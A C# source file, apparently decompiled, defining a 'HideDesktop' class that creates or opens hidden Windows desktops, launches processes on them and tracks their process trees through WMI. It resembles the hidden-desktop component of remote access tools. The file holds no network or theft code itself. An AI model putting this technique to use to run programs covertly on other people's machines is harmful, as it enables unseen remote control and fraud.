using System;
using System.Collections.Specialized;
using System.Management;
using System.Runtime.InteropServices;
using Methods.Native;

public class HideDesktop
{
	private string Desktop_name;

	private bool Disposed_Boolean;

	private static StringCollection StringCollection;

	private IntPtr HDesktop;

	public bool IsOpen => HDesktop != IntPtr.Zero;

	public IntPtr DesktopHandle => HDesktop;

	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref HandelNative.STARTUPINFO lpStartupInfo, ref HandelNative.PROCESS_INFORMATION lpProcessInformation);

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll")]
	public static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, long dwDesiredAccess);

	public static HideDesktop OpenDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		if (!hideDesktop.Open(name))
		{
			return null;
		}
		return hideDesktop;
	}

	public static HideDesktop CreateDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		if (!hideDesktop.Create(name))
		{
			return null;
		}
		return hideDesktop;
	}

	public static bool CreateProcess(string path, string desktop, bool bAppName)
	{
		if (!Exists(desktop))
		{
			return false;
		}
		HideDesktop hideDesktop = OpenDesktop(desktop);
		return hideDesktop.CreateProcess(path, bAppName);
	}

	public static void CollectProcessAndChildren(int pid)
	{
		if (pid == 0)
		{
			return;
		}
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid);
		ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
		foreach (ManagementBaseObject item in managementObjectCollection)
		{
			ManagementObject managementObject = (ManagementObject)item;
			CollectProcessAndChildren(Convert.ToInt32(managementObject["ProcessID"]));
		}
		HandelNative.m_lstProcessID.Add(pid);
	}

	public bool CreateProcess(string path, bool bAppName)
	{
		CheckDisposed();
		if (!IsOpen)
		{
			return false;
		}
		HandelNative.STARTUPINFO lpStartupInfo = default(HandelNative.STARTUPINFO);
		lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
		lpStartupInfo.lpDesktop = Desktop_name;
		HandelNative.PROCESS_INFORMATION lpProcessInformation = default(HandelNative.PROCESS_INFORMATION);
		bool result = (bAppName ? CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation) : CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation));
		CollectProcessAndChildren(lpProcessInformation.dwProcessId);
		return result;
	}

	public static bool Load(HideDesktop desktop)
	{
		return desktop.IsOpen && HandelNative.SetThreadDesktop(desktop.DesktopHandle);
	}

	public bool Create(string name)
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		bool result;
		if (Exists(name))
		{
			result = Open(name);
		}
		else
		{
			HDesktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511L, IntPtr.Zero);
			Desktop_name = name;
			bool flag = HDesktop == IntPtr.Zero;
			result = !flag;
		}
		return result;
	}

	public bool Open(string name)
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		HDesktop = OpenDesktop(name, 0, fInherit: false, 511L);
		bool result;
		if (HDesktop == IntPtr.Zero)
		{
			result = false;
		}
		else
		{
			Desktop_name = name;
			result = true;
		}
		return result;
	}

	private void CheckDisposed()
	{
		if (Disposed_Boolean)
		{
			throw new ObjectDisposedException("");
		}
	}

	public bool Close()
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero)
		{
			bool flag = HandelNative.CloseDesktop(DesktopHandle);
			if (flag)
			{
				HDesktop = IntPtr.Zero;
				Desktop_name = string.Empty;
			}
			return flag;
		}
		return true;
	}

	public static bool Exists(string name)
	{
		return Exists(name, caseInsensitive: false);
	}

	public static bool Exists(string name, bool caseInsensitive)
	{
		string[] desktops = GetDesktops();
		string[] array = desktops;
		foreach (string text in array)
		{
			if (caseInsensitive)
			{
				if (object.Equals(text.ToLower(), name.ToLower()))
				{
					return true;
				}
			}
			else if (object.Equals(text, name))
			{
				return true;
			}
		}
		return false;
	}

	private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
	{
		StringCollection.Add(lpszDesktop);
		return true;
	}

	public static string[] GetDesktops()
	{
		IntPtr processWindowStation = HandelNative.GetProcessWindowStation();
		string[] result;
		if (processWindowStation == IntPtr.Zero)
		{
			result = new string[0];
		}
		else
		{
			StringCollection stringCollection = Valua(ref StringCollection, new StringCollection());
			string[] array;
			lock (stringCollection)
			{
				if (!HandelNative.EnumDesktops(processWindowStation, DesktopProc, IntPtr.Zero))
				{
					return new string[0];
				}
				array = new string[StringCollection.Count];
				int i = 0;
				for (int num = array.Length - 1; i <= num; i++)
				{
					array[i] = StringCollection[i];
				}
			}
			result = array;
		}
		return result;
	}

	public static T Valua<T>(ref T target, T value)
	{
		target = value;
		return value;
	}
}
